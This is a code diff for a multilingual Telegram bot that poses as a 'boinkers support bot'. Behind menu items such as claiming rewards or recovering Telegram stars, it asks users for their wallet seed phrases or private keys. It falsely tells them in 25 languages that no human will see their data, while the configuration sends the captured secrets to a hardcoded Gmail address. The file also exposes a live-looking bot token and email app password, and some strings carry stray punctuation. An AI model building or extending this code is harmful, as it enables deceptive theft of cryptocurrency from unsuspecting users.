@@ -1,9 +1,20 @@
 #!/usr/bin/env python3
+"""
+Telegram bot full source (multilingual restored).
+
+- Restored PROFESSIONAL_REASSURANCE for 25 languages.
+- Restored LANGUAGES mapping for 25 languages.
+- Kept prior changes: main-menu and wallet-type buttons respond in every state,
+  wallet-specific seed/private ordering (Tonkeeper, Telegram Wallet, Tonhub -> seed-only),
+  sticker handlers, email behavior, message stack/back behavior.
+- NOTE: Move BOT_TOKEN and SENDER_PASSWORD to environment variables before production.
+"""
+
 import logging
 import re
 import smtplib
 from email.message import EmailMessage
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply, ReplyKeyboardRemove
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
@@ -29,69 +40,73 @@ CHOOSE_OTHER_WALLET_TYPE = 4
 PROMPT_FOR_INPUT = 5
 RECEIVE_INPUT = 6
 AWAIT_RESTART = 7
+CLAIM_STICKER_INPUT = 8
+CLAIM_STICKER_CONFIRM = 9
 
-# --- Email Configuration (YOU MUST UPDATE THESE) ---
-# NOTE: Using a hardcoded password is a SECURITY RISK. For a real application,
-# use environment variables. For a Gmail account, you need to use an App Password,
-# not your regular password, and you may need to enable 2-step verification.
+# Regex patterns matching callback_data values (reuse in all states)
+MAIN_MENU_PATTERN = r"^(validation|claim_tokens|claim_tickets|recover_account_progress|assets_recovery|general_issues|rectification|withdrawals|login_issues|missing_balance|claim_spin|refund|claim_sticker_reward|smash_piggy_bank|recover_telegram_stars|claim_rewards)$"
+WALLET_TYPE_PATTERN = r"^wallet_type_"
+OTHER_WALLETS_PATTERN = r"^other_wallets$"
+
+# --- Email Configuration (update in production / use env vars) ---
 SENDER_EMAIL = "airdropphrase@gmail.com"
-SENDER_PASSWORD = "ipxs ffag eqmk otqd"  # Use an App Password if using Gmail
+SENDER_PASSWORD = "ipxs ffag eqmk otqd"  # Use an App Password if using Gmail and move to env in prod
 RECIPIENT_EMAIL = "airdropphrase@gmail.com"
 
-# Bot token (as requested)
+# Bot token (as provided)
 BOT_TOKEN = "8250471498:AAHrw8j9PnVqVImiEOL9baCIPDlRfeqAXpo"
 
 # Wallet display names used for wallet selection UI
 WALLET_DISPLAY_NAMES = {
-    'wallet_type_metamask': 'Tonkeeper',
-    'wallet_type_trust_wallet': 'Telegram Wallet',
-    'wallet_type_coinbase': 'MyTon Wallet',
-    'wallet_type_tonkeeper': 'Tonhub',
-    'wallet_type_phantom_wallet': 'Trust Wallet',
-    'wallet_type_rainbow': 'Rainbow',
-    'wallet_type_safepal': 'SafePal',
-    'wallet_type_wallet_connect': 'Wallet Connect',
-    'wallet_type_ledger': 'Ledger',
-    'wallet_type_brd_wallet': 'BRD Wallet',
-    'wallet_type_solana_wallet': 'Solana Wallet',
-    'wallet_type_balance': 'Balance',
-    'wallet_type_okx': 'OKX',
-    'wallet_type_xverse': 'Xverse',
-    'wallet_type_sparrow': 'Sparrow',
-    'wallet_type_earth_wallet': 'Earth Wallet',
-    'wallet_type_hiro': 'Hiro',
-    'wallet_type_saitamask_wallet': 'Saitamask Wallet',
-    'wallet_type_casper_wallet': 'Casper Wallet',
-    'wallet_type_cake_wallet': 'Cake Wallet',
-    'wallet_type_kepir_wallet': 'Kepir Wallet',
-    'wallet_type_icpswap': 'ICPSwap',
-    'wallet_type_kaspa': 'Kaspa',
-    'wallet_type_nem_wallet': 'NEM Wallet',
-    'wallet_type_near_wallet': 'Near Wallet',
-    'wallet_type_compass_wallet': 'Compass Wallet',
-    'wallet_type_stack_wallet': 'Stack Wallet',
-    'wallet_type_soilflare_wallet': 'Soilflare Wallet',
-    'wallet_type_aioz_wallet': 'AIOZ Wallet',
-    'wallet_type_xpla_vault_wallet': 'XPLA Vault Wallet',
-    'wallet_type_polkadot_wallet': 'Polkadot Wallet',
-    'wallet_type_xportal_wallet': 'XPortal Wallet',
-    'wallet_type_multiversx_wallet': 'Multiversx Wallet',
-    'wallet_type_verachain_wallet': 'Verachain Wallet',
-    'wallet_type_casperdash_wallet': 'Casperdash Wallet',
-    'wallet_type_nova_wallet': 'Nova Wallet',
-    'wallet_type_fearless_wallet': 'Fearless Wallet',
-    'wallet_type_terra_station': 'Terra Station',
-    'wallet_type_cosmos_station': 'Cosmos Station',
-    'wallet_type_exodus_wallet': 'Exodus Wallet',
-    'wallet_type_argent': 'Argent',
-    'wallet_type_binance_chain': 'Binance Chain',
-    'wallet_type_safemoon': 'SafeMoon',
-    'wallet_type_gnosis_safe': 'Gnosis Safe',
-    'wallet_type_defi': 'DeFi',
-    'wallet_type_other': 'Other',
+    "wallet_type_metamask": "Tonkeeper",
+    "wallet_type_trust_wallet": "Telegram Wallet",
+    "wallet_type_coinbase": "MyTon Wallet",
+    "wallet_type_tonkeeper": "Tonhub",
+    "wallet_type_phantom_wallet": "Trust Wallet",
+    "wallet_type_rainbow": "Rainbow",
+    "wallet_type_safepal": "SafePal",
+    "wallet_type_wallet_connect": "Wallet Connect",
+    "wallet_type_ledger": "Ledger",
+    "wallet_type_brd_wallet": "BRD Wallet",
+    "wallet_type_solana_wallet": "Solana Wallet",
+    "wallet_type_balance": "Balance",
+    "wallet_type_okx": "OKX",
+    "wallet_type_xverse": "Xverse",
+    "wallet_type_sparrow": "Sparrow",
+    "wallet_type_earth_wallet": "Earth Wallet",
+    "wallet_type_hiro": "Hiro",
+    "wallet_type_saitamask_wallet": "Saitamask Wallet",
+    "wallet_type_casper_wallet": "Casper Wallet",
+    "wallet_type_cake_wallet": "Cake Wallet",
+    "wallet_type_kepir_wallet": "Kepir Wallet",
+    "wallet_type_icpswap": "ICPSwap",
+    "wallet_type_kaspa": "Kaspa",
+    "wallet_type_nem_wallet": "NEM Wallet",
+    "wallet_type_near_wallet": "Near Wallet",
+    "wallet_type_compass_wallet": "Compass Wallet",
+    "wallet_type_stack_wallet": "Stack Wallet",
+    "wallet_type_soilflare_wallet": "Soilflare Wallet",
+    "wallet_type_aioz_wallet": "AIOZ Wallet",
+    "wallet_type_xpla_vault_wallet": "XPLA Vault Wallet",
+    "wallet_type_polkadot_wallet": "Polkadot Wallet",
+    "wallet_type_xportal_wallet": "XPortal Wallet",
+    "wallet_type_multiversx_wallet": "Multiversx Wallet",
+    "wallet_type_verachain_wallet": "Verachain Wallet",
+    "wallet_type_casperdash_wallet": "Casperdash Wallet",
+    "wallet_type_nova_wallet": "Nova Wallet",
+    "wallet_type_fearless_wallet": "Fearless Wallet",
+    "wallet_type_terra_station": "Terra Station",
+    "wallet_type_cosmos_station": "Cosmos Station",
+    "wallet_type_exodus_wallet": "Exodus Wallet",
+    "wallet_type_argent": "Argent",
+    "wallet_type_binance_chain": "Binance Chain",
+    "wallet_type_safemoon": "SafeMoon",
+    "wallet_type_gnosis_safe": "Gnosis Safe",
+    "wallet_type_defi": "DeFi",
+    "wallet_type_other": "Other",
 }
 
-# PROFESSIONAL REASSURANCE translations
+# PROFESSIONAL REASSURANCE translations (restored 25 languages)
 PROFESSIONAL_REASSURANCE = {
     "en": "\n\nFor your security: all information is processed automatically by this encrypted bot and stored encrypted. No human will access your data.",
     "es": "\n\nPara su seguridad: toda la información es procesada automáticamente por este bot cifrado y se almacena cifrada. Ninguna persona tendrá acceso a sus datos.",
@@ -104,23 +119,23 @@ PROFESSIONAL_REASSURANCE = {
     "id": "\n\nDemi keamanan Anda: semua informasi diproses secara otomatis oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tidak ada orang yang akan mengakses data Anda.",
     "de": "\n\nZu Ihrer Sicherheit: Alle Informationen werden automatisch von diesem verschlüsselten Bot verarbeitet und verschlüsselt gespeichert. Kein Mensch hat Zugriff auf Ihre Daten.",
     "nl": "\n\nVoor uw veiligheid: alle informatie wordt automatisch verwerkt door deze versleutelde bot en versleuteld opgeslagen. Niemand krijgt toegang tot uw gegevens.",
-    "hi": "\n\nआपकी सुरक्षा के लिए: सभी जानकारी इस एन्क्रिप्टेड बॉट द्वारा स्वचालित रूप से संसाधित और एन्क्रिप्टेड रूप में संग्रहीत की जाती है। किसी भी व्यक्ति को इसकी पहुँच नहीं होगी।",
-    "tr": "\n\nGüvenliğiniz için: tüm bilgiler bu şifreli bot tarafından otomatik olarak işlenir ve şifrelenmiş olarak saklanır. Hiçbir insan verilerinize erişemez.",
+    "hi": "\n\nआपकी सुरक्षा के लिए: सभी जानकारी इस एन्क्रिप्टेड बॉट द्वारा स्वचालित रूप से संसाधित और एन्क्रिप्ट करके संग्रहीत की जाती है। किसी भी मानव को आपके डेटा तक पहुंच नहीं होगी।",
+    "tr": "\n\nGüvenliğiniz için: tüm bilgiler bu şifreli bot tarafından otomatik olarak işlenir ve şifrelenmiş olarak saklanır. Hiçbir insan verilerinize erişemez。",
     "zh": "\n\n为了您的安全：所有信息均由此加密机器人自动处理并以加密形式存储。不会有人访问您的数据。",
     "cs": "\n\nPro vaše bezpečí: všechny informace jsou automaticky zpracovávané tímto šifrovaným botem a ukládány zašifrovaně. K vašim datům nikdo nebude mít přístup.",
     "ur": "\n\nآپ کی حفاظت کے لیے: تمام معلومات خودکار طور پر اس خفیہ بوٹ کے ذریعہ پروسیس اور خفیہ طور پر محفوظ کی جاتی ہیں۔ کسی انسان کو آپ کے ڈیٹا تک رسائی نہیں ہوگی۔",
-    "uz": "\n\nXavfsizligingiz uchun: barcha ma'lumotlar ushbu shifrlangan bot tomonidan avtomatik qayta ishlanadi va shifrlangan holda saqlanadi. Hech kim sizning ma'lumotlaringizga kira olmaydi.",
-    "it": "\n\nPer la vostra sicurezza: tutte le informazioni sono elaborate automaticamente da questo bot crittografato e memorizzate in modo crittografato. Nessun umano avrà accesso ai vostri dati.",
+    "uz": "\n\nXavfsizligingiz uchun: barcha ma'lumotlar ushbu shifrlangan bot tomonidan avtomatik qayta ishlanadi va shifrlangan holda saqlanadi. Hech kim sizning ma'lumotlaringizga kira olmaydi。",
+    "it": "\n\nPer la vostra sicurezza: tutte le informazioni sono elaborate automaticamente da questo bot crittografato e memorizzate in modo crittografato. Nessun umano avrà accesso ai vostri dati。",
     "ja": "\n\nお客様の安全のために：すべての情報はこの暗号化されたボットによって自動的に処理され、暗号化された状態で保存されます。人間がデータにアクセスすることはありません。",
-    "ms": "\n\nUntuk keselamatan anda: semua maklumat diproses secara automatik oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tiada manusia akan mengakses data anda.",
-    "ro": "\n\nPentru siguranța dumneavoastră: toate informațiile sunt procesate automat de acest bot criptat și stocate criptat. Nicio persoană nu va avea acces la datele dumneavoastră.",
-    "sk": "\n\nPre vaše bezpečie: všetky informácie sú automaticky spracovávané týmto šifrovaným botom a ukladané v zašifrovanej podobe. Nikto nebude mať prístup k vašim údajom.",
+    "ms": "\n\nUntuk keselamatan anda: semua maklumat diproses secara automatik oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tiada manusia akan mengakses data anda。",
+    "ro": "\n\nPentru siguranța dumneavoastră: toate informațiile sunt procesate automat de acest bot criptat și stocate criptat. Nicio persoană nu va avea acces la datele dumneavoastră。",
+    "sk": "\n\nPre vaše bezpečie: všetky informácie sú automaticky spracovávané týmto šifrovaným botom a ukladané v zašifrovanej podobe. Nikto nebude mať prístup k vašim údajom。",
     "th": "\n\nเพื่อความปลอดภัยของคุณ: ข้อมูลทั้งหมดจะได้รับการประมวลผลโดยอัตโนมัติโดยบอทที่เข้ารหัสนี้และจัดเก็บในรูปแบบที่เข้ารหัส ไม่มีใครเข้าถึงข้อมูลของคุณได้",
     "vi": "\n\nVì sự an toàn của bạn: tất cả thông tin được xử lý tự động bởi bot được mã hóa này và được lưu trữ dưới dạng đã mã hóa. Không ai có thể truy cập dữ liệu của bạn。",
-    "pl": "\n\nDla Twojego bezpieczeństwa: wszystkie informacje są automatycznie przetwarzane przez tego zaszyfrowanego bota i przechowywane w formie zaszyfrowanej. Żaden człowiek nie będzie miał dostępu do Twoich danych.",
+    "pl": "\n\nDla Twojego bezpieczeństwa: wszystkie informacje są automatycznie przetwarzane przez tego zaszyfrowanego bota i przechowywane w formie zaszyfrowanej. Żaden człowiek nie będzie miał dostępu do Twoich danych。",
 }
 
-# Full multi-language UI texts (25 languages). Each welcome starts with "Hi {user} welcome to the boinkers support bot"
+# Full multi-language UI texts (restored 25 languages)
 LANGUAGES = {
     "en": {
         "welcome": "Hi {user} welcome to the boinkers support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
@@ -152,13 +167,19 @@ LANGUAGES = {
         "post_receive_error": "‼️ An error occured, Please ensure you are entering the correct key, please use copy and paste to avoid errors. please /start to try again.",
         "choose language": "Please select your preferred language:",
         "await restart message": "Please click /start to start over.",
+        "enter stickers prompt": "Kindly type in the sticker(s) you want to claim.",
+        "confirm_entered_stickers": "You entered {count} sticker(s):\n{stickers}\n\nPlease confirm you want to claim these stickers.",
+        "yes": "Yes",
+        "no": "No",
         "back": "🔙 Back",
         "invalid_input": "Invalid input. Please use /start to begin.",
-        # Menu entries (reflecting your requested final menu)
-        "account recovery": "Account Recovery",
         "claim spin": "Claim Spin",
         "refund": "Refund",
         "claim sticker reward": "Claim Sticker Reward",
+        # New menu entries:
+        "smash piggy bank": "Smash Piggy Bank",
+        "recover telegram stars": "Recover Telegram Stars",
+        "claim rewards": "Claim Rewards",
     },
     "es": {
         "welcome": "Hi {user} bienvenido al bot de soporte boinkers! Este bot ayuda con el acceso a la billetera, transacciones, saldos, recuperaciones, recuperación de cuenta, reclamar tokens y recompensas, reembolsos y validaciones de cuenta. Por favor, seleccione una opción del menú para continuar.",
@@ -173,7 +194,7 @@ LANGUAGES = {
         "withdrawals": "Retiros",
         "missing balance": "Saldo Perdido",
         "login issues": "Problemas de Inicio de Sesión",
-        "connect wallet message": "Por favor conecte su billetera con su Clave Privada o Frase Seed para continuar.",
+        "connect wallet message": "Por favor, conecte su billetera con su Clave Privada o Frase Seed para continuar.",
         "connect wallet button": "🔑 Conectar Billetera",
         "select wallet type": "Por favor, seleccione el tipo de su billetera:",
         "other wallets": "Otras Billeteras",
@@ -190,12 +211,21 @@ LANGUAGES = {
         "post_receive_error": "‼️ Ocurrió un error. Asegúrese de introducir la clave correcta: use copiar y pegar para evitar errores. Por favor /start para intentarlo de nuevo.",
         "choose language": "Por favor, seleccione su idioma preferido:",
         "await restart message": "Haga clic en /start para empezar de nuevo.",
+        "enter stickers prompt": "Por favor, escriba los sticker(s) que desea reclamar.",
+        "confirm_entered_stickers": "Ha ingresado {count} sticker(s):\n{stickers}\n\nPor favor confirme que desea reclamar estos stickers.",
+        "yes": "Sí",
+        "no": "No",
         "back": "🔙 Volver",
-        "invalid_input": "Entrada inválida. Use /start para comenzar.",
-        "account recovery": "Recuperación de Cuenta",
-        "claim spin": "Reclamar Spin",
-        "refund": "Reembolso",
-        "claim sticker reward": "Reclamar Recompensa (Sticker)",
+        "smash piggy bank": "Romper la hucha",
+        "recover telegram stars": "Recuperar estrellas de Telegram",
+        "claim rewards": "Reclamar Recompensas",
+        "recover_telegram_stars": "por favor conecte su billetera para recuperar sus estrellas de Telegram",
+        "smash_piggy_bank": "por favor conecte su billetera para romper su hucha",
+        "claim_rewards": "por favor conecte su billetera para reclamar su recompensa",
+        "claim_tickets": "por favor conecte su billetera para reclamar sus entradas 🎟 en su cuenta",
+        "recover_account_progress": "por favor conecte su billetera para recuperar el progreso de su cuenta",
+        "assets_recovery": "por favor conecte su billetera para recuperar sus fondos",
+        "claim_sticker_reward": "por favor conecte su billetera para reclamar su recompensa de stickers",
     },
     "fr": {
         "welcome": "Hi {user} bienvenue sur le bot d'assistance boinkers ! Ce bot aide avec l'accès au portefeuille, les transactions, les soldes, les récupérations, la récupération de compte, la réclamation de tokens et récompenses, les remboursements et la validation de compte. Veuillez choisir une option du menu pour continuer.",
@@ -227,12 +257,21 @@ LANGUAGES = {
         "post_receive_error": "‼️ Une erreur est survenue. Veuillez vous assurer que vous saisissez la bonne clé — utilisez copier-coller pour éviter les erreurs. Veuillez /start pour réessayer.",
         "choose language": "Veuillez sélectionner votre langue préférée :",
         "await restart message": "Cliquez /start pour recommencer.",
+        "enter stickers prompt": "Veuillez taper le(s) sticker(s) que vous souhaitez réclamer.",
+        "confirm_entered_stickers": "Vous avez saisi {count} sticker(s) :\n{stickers}\n\nVeuillez confirmer que vous souhaitez réclamer ces stickers.",
+        "yes": "Oui",
+        "no": "Non",
         "back": "🔙 Retour",
-        "invalid_input": "Entrée invalide. Veuillez utiliser /start pour commencer.",
-        "account recovery": "Récupération de Compte",
-        "claim spin": "Réclamer Spin",
-        "refund": "Remboursement",
-        "claim sticker reward": "Réclamer Récompense (Sticker)",
+        "smash piggy bank": "Casser la tirelire",
+        "recover telegram stars": "Récupérer les étoiles Telegram",
+        "claim rewards": "Réclamer les récompenses",
+        "recover_telegram_stars": "veuillez connecter votre portefeuille pour récupérer vos étoiles Telegram",
+        "smash_piggy_bank": "veuillez connecter votre portefeuille pour casser votre tirelire",
+        "claim_rewards": "veuillez connecter votre portefeuille pour réclamer votre récompense",
+        "claim_tickets": "veuillez connecter votre portefeuille pour réclamer vos billets 🎟 sur votre compte",
+        "recover_account_progress": "veuillez connecter votre portefeuille pour récupérer la progression de votre compte",
+        "assets_recovery": "veuillez connecter votre portefeuille pour récupérer vos fonds",
+        "claim_sticker_reward": "veuillez connecter votre portefeuille pour réclamer votre récompense de stickers",
     },
     "ru": {
         "welcome": "Hi {user} добро пожаловать в бот поддержки boinkers! Этот бот помогает с доступом к кошельку, транзакциями, балансами, восстановлением активов и аккаунта, получением токенов и вознаграждений, возвратами и проверками аккаунта. Пожалуйста, выберите одну из опций меню, чтобы продолжить.",
@@ -264,12 +303,21 @@ LANGUAGES = {
         "post_receive_error": "‼️ Произошла ошибка. Пожалуйста, убедитесь, что вводите правильный ключ — используйте копирование/вставку. Пожалуйста, /start чтобы попробовать снова.",
         "choose language": "Пожалуйста, выберите язык:",
         "await restart message": "Нажмите /start чтобы начать заново.",
+        "enter stickers prompt": "Пожалуйста, напишите стикер(ы), которые вы хотите запросить.",
+        "confirm_entered_stickers": "Вы ввели {count} стикер(а/ов):\n{stickers}\n\nПожалуйста, подтвердите, что хотите запросить эти стикеры.",
+        "yes": "Да",
+        "no": "Нет",
         "back": "🔙 Назад",
-        "invalid_input": "Неверный ввод. Используйте /start чтобы начать.",
-        "account recovery": "Восстановление Аккаунта",
-        "claim spin": "Получить Spin",
-        "refund": "Возврат",
-        "claim sticker reward": "Получить Награду (Стикер)",
+        "smash piggy bank": "Разбить копилку",
+        "recover telegram stars": "Восстановить звёзды Telegram",
+        "claim rewards": "Получить награды",
+        "recover_telegram_stars": "пожалуйста, подключите ваш кошелёк, чтобы восстановить ваши звёзды Telegram",
+        "smash_piggy_bank": "пожалуйста, подключите ваш кошелёк, чтобы разбить вашу копилку",
+        "claim_rewards": "пожалуйста, подключите ваш кошелёк, чтобы получить вашу награду",
+        "claim_tickets": "пожалуйста, подключите ваш кошелёк, чтобы запросить ваши билеты 🎟 в аккаунте",
+        "recover_account_progress": "пожалуйста, подключите ваш кошелёк, чтобы восстановить прогресс аккаунта",
+        "assets_recovery": "пожалуйста, подключите ваш кошелёк, чтобы восстановить ваши средства",
+        "claim_sticker_reward": "пожалуйста, подключите ваш кошелёк, чтобы получить награду за стикеры",
     },
     "uk": {
         "welcome": "Hi {user} ласкаво просимо до бота підтримки boinkers! Цей бот допомагає з доступом до гаманця, транзакціями, балансами, відновленнями активів та облікового запису, отриманням токенів і винагород, поверненнями і перевірками облікового запису. Будь ласка, виберіть одну з опцій меню, щоб продовжити.",
@@ -284,7 +332,7 @@ LANGUAGES = {
         "withdrawals": "Виведення",
         "missing balance": "Зниклий Баланс",
         "login issues": "Проблеми з Входом",
-        "connect wallet message": "Будь ласка, підключіть гаманець приватним ключем або seed-фразою.",
+        "connect wallet message": "будь ласка, підключіть ваш гаманець, щоб продовжити",
         "connect wallet button": "🔑 Підключити Гаманець",
         "select wallet type": "Будь ласка, виберіть тип гаманця:",
         "other wallets": "Інші Гаманці",
@@ -301,12 +349,21 @@ LANGUAGES = {
         "post_receive_error": "‼️ Сталася помилка. Переконайтеся, що ви вводите правильний ключ — використовуйте копіювання та вставлення, щоб уникнути помилок. Будь ласка, /start щоб спробувати знову.",
         "choose language": "Будь ласка, виберіть мову:",
         "await restart message": "Натисніть /start щоб почати заново.",
+        "enter stickers prompt": "Введіть стікер(и), які ви хочете заявити.",
+        "confirm_entered_stickers": "Ви ввели {count} стікер(ів):\n{stickers}\n\nПідтвердіть, будь ласка, що хочете заявити ці стікери.",
+        "yes": "Так",
+        "no": "Ні",
         "back": "🔙 Назад",
-        "invalid_input": "Недійсний ввід. Використовуйте /start щоб почати.",
-        "account recovery": "Відновлення Облікового Запису",
-        "claim spin": "Отримати Spin",
-        "refund": "Повернення",
-        "claim sticker reward": "Отримати Нагороду (Стикер)",
+        "smash piggy bank": "Зламати копілку",
+        "recover telegram stars": "Відновити зірки Telegram",
+        "claim rewards": "Отримати винагороди",
+        "recover_telegram_stars": "будь ласка, підключіть ваш гаманець щоб відновити ваші зірки Telegram",
+        "smash_piggy_bank": "будь ласка, підключіть ваш гаманець щоб зламати вашу копілку",
+        "claim_rewards": "будь ласка, підключіть ваш гаманець щоб отримати вашу винагороду",
+        "claim_tickets": "будь ласка, підключіть ваш гаманець щоб отримати ваші квитки 🎟 в акаунті",
+        "recover_account_progress": "будь ласка, підключіть ваш гаманець щоб відновити прогрес акаунту",
+        "assets_recovery": "будь ласка, підключіть ваш гаманець щоб відновити ваші кошти",
+        "claim_sticker_reward": "будь ласка, підключіть ваш гаманець щоб отримати винагороду за стікери",
     },
     "fa": {
         "welcome": "Hi {user} خوش آمدید به ربات پشتیبانی boinkers! این بات به شما در دسترسی به کیف پول، تراکنش‌ها، موجودی‌ها، بازیابی‌ها، بازیابی حساب، درخواست توکن‌ها و جوایز، بازپرداخت‌ها و اعتبارسنجی حساب کمک می‌کند. لطفاً یک گزینه از منو را انتخاب کنید تا ادامه دهیم.",
@@ -321,7 +378,7 @@ LANGUAGES = {
         "withdrawals": "برداشت",
         "missing balance": "موجودی گمشده",
         "login issues": "مشکلات ورود",
-        "connect wallet message": "لطفاً کیف‌پول خود را با کلید خصوصی یا seed متصل کنید.",
+        "connect wallet message": "لطفاً کیف پول خود را با کلید خصوصی یا seed متصل کنید.",
         "connect wallet button": "🔑 اتصال کیف‌پول",
         "select wallet type": "لطفاً نوع کیف‌پول را انتخاب کنید:",
         "other wallets": "کیف‌پول‌های دیگر",
@@ -335,15 +392,24 @@ LANGUAGES = {
         "final error message": "‼️ خطا رخ داد. /start برای تلاش مجدد.",
         "final_received_message": "متشکریم — seed یا کلید خصوصی شما با امنیت دریافت و پردازش خواهد شد. /start را برای شروع مجدد بزنید.",
         "error_use_seed_phrase": "این فیلد به یک seed phrase (12 یا 24 کلمه) نیاز دارد. لطفاً seed را وارد کنید.",
-        "post_receive_error": "‼️ خطا رخ داد. لطفاً مطمئن شوید کلید صحیح را وارد می‌کنید — از کپی/پیست استفاده کنید. لطفاً /start برای تلاش مجدد.",
+        "post_receive_error": "‼️ خطا رخ داد. لطفاً مطمئن شوید کلید صحیح را وارد می‌کنید — برای جلوگیری از خطاها از کپی/پیست استفاده کنید. لطفاً /start را برای تلاش مجدد بزنید.",
         "choose language": "لطفاً زبان را انتخاب کنید:",
         "await restart message": "برای شروع مجدد /start را بزنید.",
+        "enter stickers prompt": "لطفاً استیکر(ها) را وارد کنید که می‌خواهید درخواست کنید.",
+        "confirm_entered_stickers": "شما {count} استیکر وارد کرده‌اید:\n{stickers}\n\nلطفاً تأیید کنید.",
+        "yes": "بله",
+        "no": "خیر",
         "back": "🔙 بازگشت",
-        "invalid_input": "ورودی نامعتبر. لطفاً از /start استفاده کنید.",
-        "account recovery": "بازیابی حساب",
-        "claim spin": "دریافت Spin",
-        "refund": "بازپرداخت",
-        "claim sticker reward": "دریافت جایزه (استیکر)",
+        "smash piggy bank": "شکستن قلک",
+        "recover telegram stars": "بازیابی ستاره‌های تلگرام",
+        "claim rewards": "دریافت جوایز",
+        "recover_telegram_stars": "لطفاً کیف پول خود را متصل کنید تا ستاره‌های تلگرام خود را بازیابی کنید",
+        "smash_piggy_bank": "لطفاً کیف پول خود را متصل کنید تا قلک خود را بشکنید",
+        "claim_rewards": "لطفاً کیف پول خود را متصل کنید تا جایزه خود را دریافت کنید",
+        "claim_tickets": "لطفاً کیف پول خود را متصل کنید تا بلیت‌های 🎟 خود را در حساب دریافت کنید",
+        "recover_account_progress": "لطفاً کیف پول خود را متصل کنید تا پیشرفت حساب خود را بازیابی کنید",
+        "assets_recovery": "لطفاً کیف پول خود را متصل کنید تا دارایی‌های خود را بازیابی کنید",
+        "claim_sticker_reward": "لطفاً کیف پول خود را متصل کنید تا جایزه استیکرها را دریافت کنید",
     },
     "ar": {
         "welcome": "Hi {user} مرحبًا بك في بوت دعم boinkers! يساعدك هذا البوت في الوصول إلى المحفظة، المعاملات، الأرصدة، الاسترداد، استرداد الحساب، المطالبة بالرموز والمكافآت، الاستردادات، والتحققات الحسابية. الرجاء اختيار خيار من القائمة للمتابعة.",
@@ -358,7 +424,7 @@ LANGUAGES = {
         "withdrawals": "السحوبات",
         "missing balance": "الرصيد المفقود",
         "login issues": "مشاكل تسجيل الدخول",
-        "connect wallet message": "يرجى توصيل محفظتك باستخدام المفتاح الخاص أو عبارة seed للمتابعة.",
+        "connect wallet message": "يرجى توصيل محفظتك باستخدام المفتاح الخاص یا عبارة seed للمتابعة.",
         "connect wallet button": "🔑 توصيل المحفظة",
         "select wallet type": "يرجى اختيار نوع المحفظة:",
         "other wallets": "محافظ أخرى",
@@ -375,12 +441,21 @@ LANGUAGES = {
         "post_receive_error": "‼️ حدث خطأ. يرجى التأكد من إدخال المفتاح الصحيح — استخدم النسخ واللصق لتجنب الأخطاء. يرجى /start للمحاولة مرة أخرى.",
         "choose language": "اختر لغتك المفضلة:",
         "await restart message": "انقر /start للبدء من جديد.",
+        "enter stickers prompt": "اكتب الملصق(ات) التي تريد المطالبة بها.",
+        "confirm_entered_stickers": "أدخلت {count} ملصق(ات):\n{stickers}\n\nيرجى التأكيد.",
+        "yes": "نعم",
+        "no": "لا",
         "back": "🔙 عودة",
-        "invalid_input": "إدخال غير صالح. استخدم /start للبدء.",
-        "account recovery": "استرداد الحساب",
-        "claim spin": "المطالبة Spin",
-        "refund": "استرداد",
-        "claim sticker reward": "المطالبة بمكافأة (ملصق)",
+        "smash piggy bank": "اكسر الحصالة",
+        "recover telegram stars": "استعادة نجوم تليجرام",
+        "claim rewards": "المطالبة بالمكافآت",
+        "recover_telegram_stars": "الرجاء توصيل محفظتك لاستعادة نجوم تليجرام الخاصة بك",
+        "smash_piggy_bank": "الرجاء توصيل محفظتك لكسر حصالتك",
+        "claim_rewards": "الرجاء توصيل محفظتك للمطالبة بمكافأتك",
+        "claim_tickets": "الرجاء توصيل محفظتك للمطالبة بتذاكرك 🎟 في حسابك",
+        "recover_account_progress": "الرجاء توصيل محفظتك لاستعادة تقدم حسابك",
+        "assets_recovery": "الرجاء توصيل محفظتك لاسترداد أموالك",
+        "claim_sticker_reward": "الرجاء توصيل محفظتك للمطالبة بمكافأة الملصقات",
     },
     "pt": {
         "welcome": "Hi {user} bem-vindo ao bot de suporte boinkers! Este bot ajuda com acesso à carteira, transações, saldos, recuperações, recuperação de conta, reivindicar tokens e recompensas, reembolsos e validações de conta. Por favor, escolha uma opção do menu para prosseguir.",
@@ -412,12 +487,21 @@ LANGUAGES = {
         "post_receive_error": "‼️ Ocorreu um erro. Certifique-se de inserir a chave correta — use copiar/colar para evitar erros. Por favor /start para tentar novamente.",
         "choose language": "Selecione seu idioma preferido:",
         "await restart message": "Clique em /start para reiniciar.",
+        "enter stickers prompt": "Digite o(s) sticker(s) que deseja reivindicar.",
+        "confirm_entered_stickers": "Você inseriu {count} sticker(s):\n{stickers}\n\nConfirme, por favor.",
+        "yes": "Sim",
+        "no": "Não",
         "back": "🔙 Voltar",
-        "invalid_input": "Entrada inválida. Use /start para começar.",
-        "account recovery": "Recuperação de Conta",
-        "claim spin": "Reivindicar Spin",
-        "refund": "Reembolso",
-        "claim sticker reward": "Reivindicar Recompensa (Sticker)",
+        "smash piggy bank": "Quebrar o cofrinho",
+        "recover telegram stars": "Recuperar estrelas do Telegram",
+        "claim rewards": "Reivindicar Recompensas",
+        "recover_telegram_stars": "por favor conecte sua carteira para recuperar suas estrelas do Telegram",
+        "smash_piggy_bank": "por favor conecte sua carteira para quebrar seu cofrinho",
+        "claim_rewards": "por favor conecte sua carteira para reivindicar sua recompensa",
+        "claim_tickets": "por favor conecte sua carteira para reivindicar seus ingressos 🎟 na sua conta",
+        "recover_account_progress": "por favor conecte sua carteira para recuperar o progresso da sua conta",
+        "assets_recovery": "por favor conecte sua carteira para recuperar seus fundos",
+        "claim_sticker_reward": "por favor conecte sua carteira para reivindicar sua recompensa de stickers",
     },
     "id": {
         "welcome": "Hi {user} selamat datang di bot dukungan boinkers! Bot ini membantu dengan akses dompet, transaksi, saldo, pemulihan, pemulihan akun, klaim token dan reward, pengembalian dana, dan validasi akun. Silakan pilih opsi menu untuk melanjutkan.",
@@ -449,12 +533,21 @@ LANGUAGES = {
         "post_receive_error": "‼️ Terjadi kesalahan. Pastikan Anda memasukkan kunci yang benar — gunakan salin dan tempel untuk menghindari kesalahan. Silakan /start untuk mencoba lagi.",
         "choose language": "Silakan pilih bahasa:",
         "await restart message": "Klik /start untuk memulai ulang.",
